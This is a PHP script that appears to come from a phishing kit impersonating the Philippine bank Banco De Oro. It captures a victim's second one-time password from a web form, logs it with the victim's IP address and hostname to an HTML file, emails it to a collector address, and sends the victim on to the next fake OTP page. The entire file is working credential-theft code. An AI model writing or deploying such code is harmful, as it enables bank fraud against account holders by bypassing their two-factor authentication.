<?php
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set("Asia/Manila");
$date = gmdate ("Y/m/d");
$dateHis = gmdate ("H:i:sa");

  $onetp2 = $_POST['otp2'];
  $ontp2 = htmlentities($onetp2);

$msg .= gethostbyaddr($ip);
$msg .= "\n";
$msg .= "-------------------[Banco De Oro 2020]-----------------\n";
$msg .= "OTP 2    : ".$ontp2."\n";
$msg .= "Date     : ".$date." @ ".$dateHis."\n";
$msg .= "---------------------[Maria Clara]---------------------\n";
$file = fopen("../lib/otp.html","a+");
$table = "<font color='#C0C0C0' size='2'>|  ".$ip." OTP 2  : ".$ontp2."</font><br>";
fwrite ($file, $table);
fclose($file);

$subject = "New BDO OTP 2 ".$ontp2."";
$headers = 'From: no-reply@email.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();

$to = '';
mail($to, $subject, $msg, $headers);

header("location: ../otp2.php");
?>